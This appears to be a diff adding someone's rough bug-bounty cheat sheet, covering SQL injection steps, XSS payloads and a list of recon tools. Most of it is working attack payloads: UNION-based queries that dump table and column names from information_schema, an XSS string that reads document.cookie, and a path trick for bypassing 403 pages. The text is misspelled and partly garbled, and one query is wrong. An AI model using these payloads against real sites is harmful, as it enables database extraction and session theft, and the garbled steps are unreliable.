@@ -1,0 +1,62 @@
+
+
+1 in-bant
+  error ---> --+- or -- - you can use 
+  union
+ 
+2 inferential blind
+
+3 out-of-bant
+
+
+
+error 
+--+- or -- - you can use 
+?id=1 order by 100 -- -
+  - you can replace 100 with any number guess the how many colums are there you should try untill there is no error  
+  - if you are getting any error `?id=1 order by 5 -- -`
+
+?id=1 UNION ALL SELECT 1,2,3,4,5-- -
+it will display the which colum is vernable
+example if 2 is vernable:
+  ?id=1 UNION ALL SELECT 1,data(),3,4,5-- -
+To find the all table names in database
+  1 union all select 1,group_concat(table_name),3,4,5,6,7,8,9,10,11 from information_schema.tables where table_schema=database()--+- 
+    - In the place of `database` you can replace the actually database name or you can convert string to hex and use that hex in the place of database()
+    1 union all select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11 from information_schema.tables where table_name=database()--+- 
+data()
+database()
+version()
+user()
+bug-bounty-dorks/dorks.txt
+
+bugcrowd
+
+payloadbox
+
+"><image/src=x>
+
+"><image/src=x onerror=conform(1)>
+
+"><image/src=x onerror=prompt(1)>
+
+"><image/src=x onerror=prompt(document.cookie)>
+
+
+
+
+
+shodar
+zoomeye
+fofa
+censys
+
+
+security trail ---> for subdomain
+tool in linux -->assetfinder,subfinder
+to avoid dead subdomain use ---> httpx github for online httpstatus.io
+waybackurl github tool
+bypass-403 
+
+if you page is forbinate use ..;
+
